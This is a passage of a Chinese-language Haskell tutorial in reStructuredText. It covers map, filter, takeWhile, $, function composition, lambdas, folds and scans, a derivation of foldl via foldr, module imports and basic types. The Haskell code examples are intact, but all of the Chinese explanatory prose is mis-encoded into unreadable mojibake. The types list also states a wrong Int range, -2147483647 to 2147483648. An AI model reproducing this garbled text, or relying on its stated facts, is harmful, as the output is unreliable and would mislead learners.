               [('h',1),('e',2),('l',3),('l',4),('o',5)]

         .. rubric:: ` <#map>`__ map
            :name: map

            map :: (a -> b) -> [a] -> [b]

            map ÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞ f Âíå‰∏Ä‰∏™ÂàóË°® [a]ÔºåÂØπÂàóË°®ÊØè‰∏™ÂÖÉÁ¥†Â∫îÁî® f Âπ∂ËøîÂõûÁªìÊûúÁªÑÊàêÁöÑÂàóË°® [b]Ôºö

            .. container:: float highlight haskell
            ::

               ghci> map (+3) [1,5,3,1,6]  
               [4,8,6,4,9]  

            map ÂáΩÊï∞‰∏é fmap ÂáΩÊï∞ÁöÑÂ∑ÆÂà´Âú®‰∫éÂêéËÄÖÊòØ Functor ÂèØ‰ª•‰∏éÂÖ∂ÂÆÉÂáΩÂ≠ê‰∏ÄËµ∑‰ΩøÁî®Ôºö
            ::

               ghci> :t map
               map :: (a -> b) -> [a] -> [b]

               ghci> :t fmap
               fmap :: Functor f => (a -> b) -> f a -> f b 


         .. rubric:: ` <#filter>`__ filter
            :name: filter

            filter :: (a -> Bool) -> [a] -> [a]

            filter ÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞ f Âíå‰∏Ä‰∏™ÂàóË°® aÔºåÂ∞ÜÂàóË°® a ‰∏≠ÁöÑÊØè‰∏™ÂÖÉÁ¥†‰º†ÂÖ•ÂáΩÊï∞ f ‰∏≠Ôºå
            Â¶ÇÊûúÁªìÊûú‰∏∫ True Â∞±‰øùÁïôÔºåÁªìÊûú‰∏∫ False Â∞±‰∏¢ÂºÉÔºåËøîÂõûÊâÄÊúâ‰øùÁïôÁöÑÂÖÉÁ¥†ÁªÑÊàêÁöÑÊñ∞ÂàóË°®Ôºö

            .. container:: float highlight haskell
            ::

               ghci> filter even [1..10]  
               [2,4,6,8,10] 


         .. rubric:: ` <#takeWhile>`__ takeWhile
            :name: takeWhile

            takeWhile :: (a -> Bool) -> [a] -> [a]

            takeWhile ÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™ÂáΩÊï∞fÂíå‰∏Ä‰∏™ÂàóË°® aÔºåÂ∞ÜÂàóË°® a ‰∏≠‰ªéÂ∑¶ÂêëÂè≥ÊØè‰∏™ÂÖÉÁ¥†‰º†ÂÖ•ÂáΩÊï∞ fÔºå
            Áõ¥Âà∞ÁªìÊûú‰∏∫ False ÂÅúÊ≠¢ÔºåËøîÂõûÂÅúÊ≠¢Ââç‰º†ÂÖ•ÁöÑÊâÄÊúâÂÖÉÁ¥†ÁªÑÊàêÁöÑÊñ∞ÂàóË°®Ôºö

            .. container:: float highlight haskell
            ::

               ghci> takeWhile (/=' ') "word1 word2"
               "word1"


      .. rubric:: ` <#Function-application>`__ Function application
         :name: Function-application

         ÂáΩÊï∞Â∫îÁî®ÂèØ‰ª•‰ΩøÁî® ``$`` ÂáΩÊï∞ÔºåÂÆÉÁöÑÁ±ªÂûãÊòØÔºö

         ($) :: (a -> b) -> a -> b

         ÂÆÉÂèØ‰ª•ÊîπÂèòÂáΩÊï∞ÁªìÂêà‰ºòÂÖàÁ∫ßÔºåÂ∞ÜÂ∑¶‰æßÂáΩÊï∞Â∫îÁî®‰∫éÂÖ®ÈÉ®Âè≥‰æßÂÜÖÂÆπ‰∏äÔºåÁõ∏ÂΩì‰∫éÁªôÂè≥‰æßÊï¥‰ΩìÂä†‰∏ä‰∫ÜÊã¨Âè∑„ÄÇ
         Âê¶ÂàôÂáΩÊï∞ÈªòËÆ§Â∑¶ÁªìÂêàÔºå‰ºö‰æùÊ¨°ÂêëÂè≥Â∫îÁî®ËÄå‰∏ç‰ºöÂ∫îÁî®Âú®Êï¥‰Ωì‰∏ä„ÄÇ

         .. container:: float highlight haskell
         ::

            f $ g x     -- Á≠â‰ª∑‰∫é f (g x)
            
            f g x       -- Á≠â‰ª∑‰∫é (f g) x


      .. rubric:: ` <#Function-Composition>`__ Function Composition
         :name: Function-Composition

         Êï∞Â≠¶ËØ≠Ë®Ä‰ΩøÁî® ‚àò Á¨¶Âè∑Ë°®Á§∫Â§çÂêàÂáΩÊï∞ÔºåÂç≥Â∞ÜÂ§ö‰∏™ÂáΩÊï∞Â§çÂêàÂæóÂà∞‰∏Ä‰∏™ÂáΩÊï∞ÔºåÊØîÂ¶Ç (f‚àòg)(x) Ë°®Á§∫ f(g(x))„ÄÇ
         Haskell ‰∏≠‰ΩøÁî® ``.`` ÂáΩÊï∞Â§çÂêàÂ§ö‰∏™ÂáΩÊï∞ÔºåÂè™ÈúÄË¶ÅÂú®Ë¶ÅÂ§çÂêàÁöÑÂáΩÊï∞‰πãÈó¥‰ΩøÁî®ÂÆÉÔºåÂÆÉÁöÑÁ±ªÂûãÊòØÔºö

         (.) :: (b -> c) -> (a -> b) -> a -> c

         ÂÆö‰πâÊòØÔºö

            f . g = \\x -> f (g x)

         ‰ΩÜÊòØÂáΩÊï∞Â§çÂêàÁöÑ‰ºòÂÖàÁ∫ßË¶ÅÊØîÂáΩÊï∞ÊâßË°å‰ΩéÔºåÊØîÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            sum . replicate 5 . max 6.7 8.9

         ‰ºöÂÖàÊâßË°åmax 6.7 8.9Âπ∂ËøîÂõû8.9ÔºåÁÑ∂ÂêéÂ∞Üsum„ÄÅreplicate
         5„ÄÅ8.9Â§çÂêàÔºå‰ΩÜ‰∏§‰∏™ÂáΩÊï∞Êó†Ê≥ïÂíå‰∏Ä‰∏™ÂÄº(8.9)Â§çÂêàÔºåÊâÄ‰ª•‰ºöÊäõÂá∫ÂºÇÂ∏∏„ÄÇÂõ†Ê≠§Ë¶Å‰ΩøÁî® ``$`` Êù•ËßÑÂÆöÂÖàÂ§çÂêàÂÜçÊâßË°åÔºö

         .. container:: float highlight haskell
         ::

            sum . replicate 5 . max 6.7 $ 8.9


      .. rubric:: ` <#lambda>`__ lambda
         :name: lambda

         Haskell ËØ≠Ë®ÄÁöÑÂåøÂêçÂáΩÊï∞Ôºàlambda expressionÔºâË°®ËææÂºè‰ΩøÁî®ÊñúÊù† ``\`` Êù•Ë°®Á§∫ÔºåÂèØËÉΩÁúãÁùÄÂÉè ŒªÔºü

         .. container:: float highlight haskell
         ::

            \para1 para2 ... -> return

         ‚Äú->‚Äù ÂâçÊòØ‰º†ÂÖ•ÂèÇÊï∞Ôºàpara1 para2 ‚Ä¶ÔºâÔºåÂçï‰∏™Â§ö‰∏™ÈÉΩÂèØ‰ª•ÔºåÈúÄË¶ÅÁî®Á©∫Ê†ºÈöîÂºÄÔºõ
         ‚Äù->‚Äù ÂêéÊòØËÆ°ÁÆóÂæóÂà∞ÁöÑËøîÂõûÂÄºÔºàreturnÔºâ„ÄÇ‰∏ÄËà¨ÈúÄË¶ÅÁî®Êã¨Âè∑Â∞ÜÊï¥‰∏™Ë°®ËææÂºèÊã¨Ëµ∑Êù•ÔºåÈò≤Ê≠¢ËøîÂõûÂÄºÈÉ®ÂàÜ‰∏ÄÁõ¥ÂêëÂè≥Âª∂‰º∏„ÄÇ


      .. rubric:: ` <#foldÂíåscan>`__ foldÂíåscan
         :name: foldÂíåscan

         fold Âíå scan ÈÉΩÊé•Êî∂‰∏â‰∏™ÂèÇÊï∞Ôºà‰∏Ä‰∏™‰∫åÂÖÉÂáΩÊï∞Ôºå‰∏Ä‰∏™ÂàùÂßãÂÄº accumulatorÔºå‰∏Ä‰∏™Ë¶ÅÊäòÂè†ÁöÑÂàóË°®Ôºâ„ÄÇ
         fold ËøîÂõû‰∏Ä‰∏™ÂÄºÔºåscan ËøîÂõû‰∏Ä‰∏™ÂàóË°®„ÄÇ

         ÂáΩÊï∞Â∞Ü accumulator Âíå‰ªéÂàóË°®‰∏≠ÂèñÂá∫ÁöÑÂÄº‰∏ÄÂêå‰º†ÂÖ•ÁªôÂèÇÊï∞ÊåáÂÆöÁöÑ‰∫åÂÖÉÂáΩÊï∞ ``f :: a -> b -> b``„ÄÇ
         ÂáΩÊï∞ÂêçÁß∞ÂêéÁºÄ l Êàñ r ÂØπÂ∫îÂêëÂ∑¶„ÄÅÂêëÂè≥ÊäòÂè†ÊàñÊâ´Êèè‰∏§ÁßçÂΩ¢Âºè„ÄÇ

      .. rubric:: ` <#foldl>`__ foldl
         :name: foldl

         Â∑¶ÊäòÂè†ÔºåÊØèÊ¨°‰ªéÂàóË°®ÊúÄÂ∑¶‰æßÂèñÂá∫‰∏Ä‰∏™ÂÄºÔºåÂíå accumulator ‰∏ÄËµ∑‰º†ÂÖ•‰∫åÂÖÉÂáΩÊï∞ÔºåÂπ∂‰∏î accumulator Âú®Â∑¶Ëæπ‰∏∫Á¨¨‰∏Ä‰∏™ÂèÇÊï∞ÔºåÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            foldl f a xs

         ÂÆÉÁöÑÁªìÊûúËÆ°ÁÆóËøáÁ®ã‰∏∫

         .. container:: float highlight haskell
         ::

            > foldl f a [x1, x2, x3]
            [1.] a = f a x1
            [2.] a = f a x2 = f (f a x1) x2
            [3.] a = f a x3 = f (f (f a x1) x2) x3

         ÂèØ‰ª•ÁúãÂá∫ f (f a x1) x2 ÂÖ∂ÂÆûÂ∞±ÊòØ foldl f a [x1, x2]
         ËÄå‰∏îÂõ†Ê≠§ÔºåfoldlÂú®ËÆ°ÁÆóÊó∂ÊúÄÂ§ñÂ±ÇÈúÄË¶ÅÊâæÂà∞x3ÔºåËøôÊ†∑Â¶ÇÊûúxsÊòØ‰∏Ä‰∏™Êó†Á©∑ÂàóË°®ÔºåÈÇ£‰πàÂ∞ÜÊó†Ê≥ïËÆ°ÁÆóÔºåÈô∑ÂÖ•Êó†Á©∑„ÄÇÊâÄ‰ª•foldlËôΩÁÑ∂ÁúãËµ∑Êù•‰ªéÂ∑¶ËæπÂèñÂÄºÔºå‰ΩÜÊòØÂáΩÊï∞ÈúÄË¶Å‰ªéÂè≥‰æßÂ±ïÂºÄÔºåÂπ∂‰∏çÈÄÇÁî®‰∫éÊó†Á©∑ÂàóË°®

      .. rubric:: ` <#foldr>`__ foldr
         :name: foldr

         Âè≥ÊäòÂè†ÔºåÊØèÊ¨°‰ªéÂàóË°®ÊúÄÂè≥‰æßÂèñÂá∫‰∏Ä‰∏™ÂÄºÔºåÂíåaccumulator‰∏ÄËµ∑‰º†ÂÖ•‰∫åÂÖÉÂáΩÊï∞ÔºåÂπ∂‰∏îaccumulatorÂú®Âè≥Ëæπ‰∏∫Á¨¨‰∫å‰∏™ÂèÇÊï∞ÔºåÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            foldr f a xs

         ÂÆÉÁöÑÁªìÊûúËÆ°ÁÆóËøáÁ®ã‰∏∫

         .. container:: float highlight haskell
         ::

            > foldr f a [x1, x2, x3]
            [1.] a = f x3 a
            [2.] a = f x2 a = f x2 (f x3 a)
            [3.] a = f x1 a = f x1 (f x2 (f x3 a))

         | ‰ªé‰∏≠ÂèØ‰ª•ÁúãÂá∫ f x2 (f x3 a) Â∞±ÊòØ foldr f a [x2, x3]
         | Âõ†Ê≠§ÂèØ‰ª•‰ΩøÁî®ÈÄíÂΩíÊù•ÂÜô‰∏Ä‰∏™ÂíåfoldrÊïàÊûú‰∏ÄÊ†∑ÁöÑÂáΩÊï∞:

         .. container:: float highlight haskell
         ::

            foldr' :: (a -> b -> b) -> b -> [a] -> b
            foldr' _ x [] = x
            foldr' f a (x:xs) = f x (foldr' f a xs)

         ‰πüÂèØ‰ª•ÁúãÂá∫ÔºåÊúÄÂ§ñÂ±ÇËÆ°ÁÆóÊó∂Âè™ÈúÄË¶Åx1Âπ∂‰∏îÂêë‰∏ãÈÄíÂΩíÔºåÂπ∂‰∏ç‰ºöÊé•Ëß¶Âà∞ÂàóË°®Êú´Â∞æÔºåÂõ†Ê≠§ÂèØ‰ª•Áî®‰∫éÊó†Á©∑ÂàóË°®„ÄÇfoldrÂç≥‰ΩøÁúã‰∏äÂéª‰ªéÂè≥ËæπÂèñÂÄºÔºå‰ΩÜÊòØË¶Å‰ªéÂ∑¶ÂºÄÂßãÂ±ïÂºÄÔºåÂèØ‰ª•Áî®‰∫éÊó†Á©∑ÂàóË°®

         ‰æãÂ¶ÇÔºö

         .. container:: float highlight haskell
         ::

            ghci> foldr (||) False (repeat True)
            True    -- Áî±‰∫éÈÄªËæëËøêÁÆóÂ≠òÂú®Áü≠Ë∑ØÔºåËÆ°ÁÆóÂÄºÂÖ®Â∫î‰∏∫TrueÔºåÊâÄ‰ª•Áõ¥Êé•ËøîÂõû‰∫Ü
            ghci> foldl (||) False (repeat True)
            -- ËøôÈáå‰ªÄ‰πàÈÉΩ‰∏ç‰ºöÂèëÁîüÔºåÁõ¥Âà∞ÁîµËÑëÂÜÖÂ≠òË¢´ÁàÜÊéâ
            -- Âõ†‰∏∫ÂáΩÊï∞ÂàöÂºÄÂßãÂ∞±ÈúÄË¶ÅÂàóË°®ÊúÄÂè≥‰æßÁöÑÂÄºÔºåÊâÄ‰ª•Âú®‰∏çÊñ≠ËÆ°ÁÆóËøô‰∏™Êó†Á©∑ÂàóË°®

      .. rubric:: ` <#scanlÂíåscanr>`__ scanlÂíåscanr
         :name: scanlÂíåscanr

      | scanÁ±ª‰ººfoldÔºåÂè™ÊòØÂ∞Ü‰∏≠Èó¥ÂæóÂà∞ÁöÑÊØè‰∏Ä‰∏™ÂÄºÈÉΩÊ∑ªÂä†Ëøõ‰∏Ä‰∏™ÂàóË°®‰∏≠Âπ∂ËøîÂõûËøô‰∏™ÂàóË°®
      | scanlÂàôÂêëÂè≥Âª∂‰º∏Ëøô‰∏™ÂàóË°®ÔºåscanrÂàôÂêëÂ∑¶Âª∂‰º∏Ëøô‰∏™ÂàóË°®
      | ‰ΩÜÊòØÂÆÉÂíåfoldÊÅ∞ÊÅ∞Áõ∏ÂèçÔºåscanlËÉΩÁî®‰∫éÊó†Á©∑ÂàóË°®ÔºåËÄåscanr‰∏çËÉΩ

      .. container:: float highlight haskell
      ::

         > scanr f a [x1, x2, x3]
         [1.] ÊúÄÂè≥‰æßÂÖÉÁ¥†(-1 in python) : a
         [2.] Âè≥‰æßÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†(-2) : f x3 a
         [3.] Âè≥‰æßÁ¨¨‰∏â‰∏™ÂÖÉÁ¥†(-3) : f x2 (f x3 a)
         [4.] Âè≥‰æßÁ¨¨Âõõ‰∏™ÂÖÉÁ¥†(-4) : f x1 (f x2 (f x3 a))

      | ÂèØ‰ª•ÁúãÂá∫ f x2 (f x3 a) ÊòØ foldr f a [x2, x3]Ôºå‰πüÊòØ
        scanr f a [x2, x3] ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†
      | Âõ†Ê≠§ÂèØ‰ª•Áî®ÈÄíÂΩíÊù•ÂÜô‰∏Ä‰∏™ÂíåscanrÊïàÊûú‰∏ÄÊ†∑ÁöÑÂáΩÊï∞Ôºö

      .. container:: float highlight haskell
      ::

         scanr' :: (a -> b -> b) -> b -> [a] -> [b]
         scanr' _ x [] = [x]
         -- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs
         scanr' f a (x:xs) = f x q : qs
                             where qs@(q:_) = scanr' f a xs

      scanl‰πüÊòØÂêåÁêÜÔºö

      .. container:: float highlight haskell
      ::

         scanl' :: (b -> a -> b) -> b -> [a] -> [b]
         scanl' _ x [] = [x]
         scanl' f a (x:xs) = a : scanl' f (f a x) xs

      ‰πüÂèØ‰ª•ÁúãÂá∫ÔºåscanrËøîÂõûÁöÑÂàóË°®ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÊòØÊúÄÂêéÊ∑ªÂä†ËøõÂéªÁöÑÔºåÊâÄ‰ª•ÂÆÉÊó†Ê≥ïÁî®‰∫éÊó†Á©∑ÂàóË°®„ÄÇËÄåscanlËøîÂõûÁöÑÂàóË°®‰∏≠ÁöÑÂÖÉÁ¥†ÊòØ‰ªéÂ∑¶Âà∞Âè≥‰æùÊ¨°Ê∑ªÂä†ÔºåÂèØ‰ª•Áî®‰∫éÊó†Á©∑ÂàóË°®Êà™ÂèñÂâç‰∏ÄÈÉ®ÂàÜÁªìÊûúÔºö

      .. container:: float highlight haskell
      ::

         ghci> take 10 (scanl (+) 0 [1..])
         [0,1,3,6,10,15,21,28,36,45]
         ghci> take 10 (scanr (+) 0 [1..])
         [*** Exception: stack overflow

      .. rubric:: ` <#‰ΩøÁî®foldrÁºñÂÜôfoldl>`__ ‰ΩøÁî®foldrÁºñÂÜôfoldl
         :name: ‰ΩøÁî®foldrÁºñÂÜôfoldl

      pdcxsËøòÁªôÊàë‰ªãÁªç‰∫Ü‰∏Ä‰∏™Á•ûÂ•áÁöÑÊìç‰ΩúÔºåÁî®foldlÊù•ÂÆö‰πâfoldrÔºö

      .. container:: float highlight haskell
      ::

         foldl' f z xs = foldr (\x g y -> g (f y x)) id xs z

      ÂÆÉÂà©Áî® foldr (\\x g y -> g (f y x)) id xs
      ÁîüÊàê‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰ΩúÁî®‰∫ézÂæóÂà∞ÁªìÊûú„ÄÇ

      ÂÖàÊù•Áúã‰∏Ä‰∏ãfoldrÁöÑÁ±ªÂûãÔºö

      .. container:: float highlight haskell
      ::

         foldr :: Foldable t => (a -> b -> b) -> b -> t a -> b
         -- ÂèØ‰ª•ÁúãÊàê (a -> b -> b) -> b -> [a] -> b

      ‰ΩÜÊòØÂú®Ëøô‰∏™‰æãÂ≠ê‰∏≠ÔºåÁ±ªÂûãbÂπ∂‰∏çÊòØ‰∏Ä‰∏™Êï∞Â≠óÔºåËÄåÊòØ‰∏Ä‰∏™ÂáΩÊï∞(b
      -> b)„ÄÇ

      ÊâÄ‰ª•ËøôÈáåfoldrÁöÑÁ±ªÂûãÂèØ‰ª•ÂÜôÊàêÔºö

      (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b
      -> b)

      | ÂØπÂ∫î‰∫éÁî®Ê≥ï foldr (\\x g y -> g (f y x)) id xs
        ÔºåÂÆÉËøîÂõûÁöÑÂÄºÂ∫îËØ•ÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁ±ªÂûã‰∏∫ b ->
        bÔºàÂêéÈù¢Ë¶Å‰ΩúÁî®‰∫ézÔºâ
      | ËÄåxsÂØπÂ∫î‰∫é[a]ÔºõidÂØπÂ∫î‰∫é(b -> b)
      | ÊâÄ‰ª• (\\x g y -> g (f y x)) Ë¶ÅÂØπÂ∫î‰∫éÔºö

      (a -> (b -> b) -> (b -> b))

      Âõ†Ê≠§ÂèØ‰ª•Êé®Êñ≠Âá∫xÁöÑÁ±ªÂûãÊòØaÔºõyÁöÑÁ±ªÂûãÊòØbÔºõËÄåËøîÂõûÁöÑÂÄº‰∏∫‰∏Ä‰∏™Á±ªÂûã‰∏∫(b
      -> b)ÁöÑÂáΩÊï∞„ÄÇ

      | ÂÜçÁúãÔºåËøîÂõûÁöÑÂÄºÊòØ g (f y x) ÔºåÂÖ∂‰∏≠ f y x
        ËøîÂõûÁöÑÊòØ‰∏Ä‰∏™ÂÄºÔºåÁ±ªÂûã‰∏∫b
      | ÊâÄ‰ª•gÊé•Êî∂‰∏Ä‰∏™Á±ªÂûãbÔºåËøîÂõû‰∏Ä‰∏™Á±ªÂûãb ->
        b„ÄÇÂç≥gÁöÑÁ±ªÂûã‰∏∫Ôºö

      b -> (b -> b)

      Áé∞Âú®Ê†πÊçÆfoldrÁöÑÂÆö‰πâÔºö

      foldr f a (x:xs) = f x (foldr f a xs)

      Â∏¶ÂÖ•ËÆ°ÁÆó‰∏Ä‰∏ãÔºö

         xsÂç≥‰∏∫[x1..xn]Ôºå‰∏∫‰∫ÜÊñπ‰æøÔºåÁî®xs‚ÄôÊù•Ë°®Á§∫[x2..xn]ÔºåÁî®xs‚Äô‚ÄôÊù•Ë°®Á§∫[x3..xn]

         ÂÆö‰πâ‰∏≠ÁöÑfÂç≥‰∏∫(\\x g y -> g (f y x))ÔºåaÂç≥‰∏∫id

      .. container:: float highlight haskell
      ::

           foldr (\x g y -> g (f y x)) id xs z
         = (\x g y -> g (f y x)) x1 (foldr (...) id xs') z

      ÂÜôÂÆåÁ¨¨‰∏ÄÊ≠•ÔºåÂèØ‰ª•ÂèëÁé∞Ôºåx1 (foldr (‚Ä¶) id xs‚Äô) z
      Ê≠£Â•ΩÂàÜÂà´ÂØπÂ∫î‰∫ÜlambdaË°®ËææÂºè‰∏≠ÁöÑx„ÄÅg„ÄÅy„ÄÇÂèØ‰ª•Â∞ÜÂÖ∂Â∫îÁî®ÔºåËøõ‰∏ÄÊ≠•Â±ïÂºÄÔºö

      .. container:: float highlight haskell
      ::

           (\x g y -> g (f y x)) x1 (foldr (...) id xs') z
         = (foldr (...) id xs') (f z x1)

      ‰∏çÈöæÂèëÁé∞ÔºåÂéüÂºè (foldr (‚Ä¶) id xs) z Á≠â‰ª∑‰∫éÔºö

      (foldr (...) id xs') (f z x1)

      | Ë∑üÁùÄËøô‰∏™ÊÄùË∑ØÔºåxsÊØèÊ¨°Â∞ë‰∏Ä‰∏™ÂºÄÂ§¥ÁöÑÂÖÉÁ¥†x‚ÄôÔºåzÊØèÊ¨°ÂèòÊç¢Êàê‰∏∫
        f z x‚Äô
      | Âõ†Ê≠§‰∏ã‰∏ÄÊ≠•Ôºö

      .. container:: float highlight haskell
      ::

           (\x g y -> g (f y x)) x1 (foldr (...) id xs') z
         = (foldr (...) id xs') (f z x1)
         = (foldr (...) id xs'') (f (f z x1) x2)
         = (foldr (...) id xs''') (f (f (f z x1) x2) x3)
         = ...

      ÂèØ‰ª•ÂèëÁé∞ÔºåÂ∑≤ÁªèÊúâ‰∫ÜËßÑÂæã„ÄÇÈÇ£‰πàÊúÄÁªàÂÅúÊ≠¢Êó∂ÊòØ‰ªÄ‰πàÊ†∑Âë¢Ôºü

      | ÊúÄÂêéÂà∞‰∫Ü‰∏çËÉΩÂú®Â±ïÂºÄÊó∂ÔºåÊúÄÂâçÈù¢ÁöÑ foldr (‚Ä¶) id xs
        Â∑≤ÁªèÂèòÊàê‰∫Ü foldr (‚Ä¶) id []
      | ËÄåÊ†πÊçÆÂâçÈù¢foldrÁöÑÂÆö‰πâ foldr \_ x [] = x
        ÔºåÂÆÉÂ∫îËØ•ËøîÂõûid

      | ÊâÄ‰ª•ÊúÄÂêéÁöÑÁªìÊûúÔºö
      | (idÁöÑÂÆö‰πâÔºöid x = x)

      .. container:: float highlight haskell
      ::

           ...
         = (foldr (...) id xs') (f z x1)
         = (foldr (...) id xs'') (f (f z x1) x2)
         = ...
         = (foldr (...) id []) (f (.. (f z x1) ..) xn)
         = id (f (.. (f z x1) ..) xn)
         = f (.. (f z x1) ..) xn

      | ÈÇ£‰πàÊúÄÂêéËøô‰∏™ÁªìÊûúÂ∞±ÂæàÁÜüÊÇâ‰∫ÜÔºåÂÆÉÂ∞±ÊòØ foldl f z xs„ÄÇ
      | ÊâÄ‰ª•Êàë‰ª¨Êé®ÂØºÂá∫‰∫ÜËøô‰∏™Áî®foldrË°®Á§∫foldlÁöÑÂÜôÊ≥ïÊòØÊ≠£Á°ÆÁöÑ„ÄÇ


   .. rubric:: ` <#Modules>`__ Modules
      :name: Modules

      Haskell‰ºöËá™Âä®Âä†ËΩΩPreludeÊ®°ÂùóÔºàmoduleÔºâÔºåÂ¶ÇÊûúÂú®GHCi‰∏≠ÂÜçÂä†ËΩΩÂÖ∂‰ªñÊ®°ÂùóÔºåÈúÄË¶Å‰ΩøÁî® ``:m + ...`` ÔºåÊØîÂ¶ÇÂä†ËΩΩData.ListÊ®°ÂùóÔºö

      Prelude> :m + Data.List

      ËÄåÂú®hsÊñá‰ª∂‰∏≠ÂºïÂÖ•Ê®°ÂùóÔºåÈúÄË¶Å‰ΩøÁî® ``import`` ËØ≠Âè•Ôºå‰∏ãÈù¢ÂíåpythonÁöÑÂØπÊØîÂèØ‰ª•‰æø‰∫éÁêÜËß£Ôºö

      .. container:: float highlight haskell
      ::

         import Data.List
         -- from Data.List import *

         import Data.List (nub, sort)
         -- from Data.List import nub, sort

         import Data.List hiding (nub)
         -- ‰ªéData.List‰∏≠ÂºïÂÖ•ÊâÄÊúâÔºå‰ΩÜ‰∏çÂºïÂÖ•nubÂáΩÊï∞

         import qualified Data.List
         -- import Data.List

         import qualified Data.List as Li
         -- import Data.List as Li

      .. rubric:: ` <#ÁºñÂÜôModules>`__ ÁºñÂÜôModules
         :name: ÁºñÂÜôModules

      Ê®°Âùó‰∏≠Ë¶ÅÂåÖÂê´Â∞ÜË¶Å‰ΩøÁî®ÁöÑ‰∏Ä‰∫õÂáΩÊï∞ÔºåÂÉèÊ≠£Â∏∏ÁöÑhsÊñá‰ª∂‰∏ÄÊ†∑ÂÜôÂç≥ÂèØÔºå‰ΩÜÂ§¥ÈÉ®ÈúÄË¶ÅÊúâÂØºÂá∫ËØ≠Âè•ÔºàexportÔºâ„ÄÇÊØîÂ¶Ç‰∏Ä‰∏™Ê®°ÂùóÊñá‰ª∂ÂêçÂè´ ``ModuleA.hs`` ÔºåÈÇ£ÂÆÉÁöÑÂ§¥ÈÉ®ÈúÄË¶ÅÂÜôÔºö

      .. container:: float highlight haskell
      ::

         module ModuleA
         ( functionA
         , functionB
         , functionC
         ) where

      ËÄå‰∏îÊñá‰ª∂‰∏≠ÁöÑÊâÄÊúâÂáΩÊï∞Âè™ÂØºÂá∫ÈúÄË¶Å‰ΩøÁî®ÁöÑÂç≥ÂèØ„ÄÇÊØîÂ¶ÇËØ•Êñá‰ª∂‰∏≠ËøòÂê´ÊúâfunctionD‰æõÂâç‰∏â‰∏™ÂáΩÊï∞ÂÜÖÈÉ®‰ΩøÁî®ÔºåÈÇ£‰πàÂú®import
      ModuleA‰πãÂêé‰πüÊó†Ê≥ïË∞ÉÁî®functionD„ÄÇ

      .. rubric:: ` <#Types-amp-Typeclasses>`__ Types &
         Typeclasses
         :name: Types-amp-Typeclasses

      .. rubric:: ` <#Types>`__ Types
         :name: Types

      | HaskellÊúâ‰∏Ä‰∏™ÈùôÊÄÅÁ±ªÂûãÁ≥ªÁªüÔºå‰ªª‰ΩïÂèòÈáè„ÄÅÂáΩÊï∞ÈÉΩ‰ºöÂÖ∑ÊúâÁ±ªÂûãÔºåÂπ∂‰∏îÊúâÁ±ªÂûãÂà§Êñ≠ÂäüËÉΩÔºåÊ≤°ÁªôÂá∫ÁöÑÁ±ªÂûã‰ºöËá™Âä®ËØÜÂà´„ÄÇ
      | TypeÁöÑÈ¶ñÂ≠óÊØçÂÖ®‰∏∫Â§ßÂÜôÔºåÂ∏∏Áî®ÁöÑÊúâÔºö

      -  ``Int`` ÔºöÊï¥ÂûãÔºåÊúâ‰∏ä‰∏ãÁïåËåÉÂõ¥Ôºå-2147483647ÔΩû2147483648
      -  ``Integer`` ÔºöÊï¥Êï∞ÔºåÊó†ÁïåÔºå‰ΩÜÊòØÊïàÁéáÊØîInt‰Ωé
      -  ``Float`` ÔºöÂçïÁ≤æÂ∫¶ÊµÆÁÇπÂûã
      -  ``Double`` ÔºöÂèåÁ≤æÂ∫¶ÊµÆÁÇπÂûã
      -  ``Bool`` ÔºöÂ∏ÉÂ∞îÂÄº
      -  ``Char`` ÔºöÂ≠óÁ¨¶
      -  ``String`` ÔºöÂ≠óÁ¨¶‰∏≤ÔºåÁ≠âÂêå‰∫é ``[Char]``
      -  ``Ordering`` ÔºöÂ§ßÂ∞èÂÖ≥Á≥ªÔºåÂåÖÂê´LT„ÄÅEQ„ÄÅGTÔºå‰∏îÂÆÉ‰ª¨ÊúâÂ§ßÂ∞èÂÖ≥Á≥ª
         LT < EQ < GT

      ÂàóË°®ÁöÑÁ±ªÂûãÊòØÁî±ÂÖ∂‰∏≠ÂÖÉÁ¥†ÂÜ≥ÂÆöÁöÑÔºåÂπ∂‰∏îÂàóË°®‰∏≠ÂÖÉÁ¥†ÂøÖÈ°ªÊòØÂêå‰∏ÄÁ±ªÂûãÔºåÊâÄ‰ª•ÂàóË°®ÁöÑÁ±ªÂûãÂ∞±ÊòØÂÖ∂ÂÖÉÁ¥†Á±ªÂûãÂ§ñÂä† ``[]`` „ÄÇ

      ÂÖÉÁªÑÁöÑÁ±ªÂûãÁî±ÂÖ∂‰∏≠ÂêÑ‰∏™ÂÖÉÁ¥†ÁöÑÁ±ªÂûãÂÖ±ÂêåÂÜ≥ÂÆöÔºåÂõ†‰∏∫ÂÖÉÁªÑ‰∏≠ÁöÑÂÖÉÁ¥†ÂèØ‰ª•ÊòØ‰∏çÂêåÁ±ªÂûã„ÄÇÂ¶Ç(‚Äúabc‚Äù,
      ‚Äòa‚Äô, True)ÁöÑÁ±ªÂûãÊòØ([Char], Char, Bool)„ÄÇ


   .. rubric:: ` <#Typeclasses>`__ Typeclasses
      :name: Typeclasses

      | Á±ªÂûãÁ±ªÔºàTypeclassÔºâÊòØÂÆö‰πâ‰∏ÄÁ≥ªÂàóÂäüËÉΩÁöÑÊé•Âè£ÔºåÂ¶ÇÊûú‰∏Ä‰∏™TypeÂ±û‰∫é‰∏Ä‰∏™TypeclassÁöÑÊàêÂëòÔºåÈÇ£‰πàÂÆÉÂèØ‰ª•ÂÆûÁé∞Ëøô‰∏™Á±ªÂûãÁ±ªÊâÄËßÑÂÆöÁöÑÂäüËÉΩ„ÄÇ‰∏Ä‰∏™Type‰πüÂèØ‰ª•Â±û‰∫éÂ§ö‰∏™Typeclass
      | TypeclassÁöÑÈ¶ñÂ≠óÊØç‰πüÂÖ®‰∏∫Â§ßÂÜôÔºåÂ∏∏ËßÅÁöÑÊúâÔºö

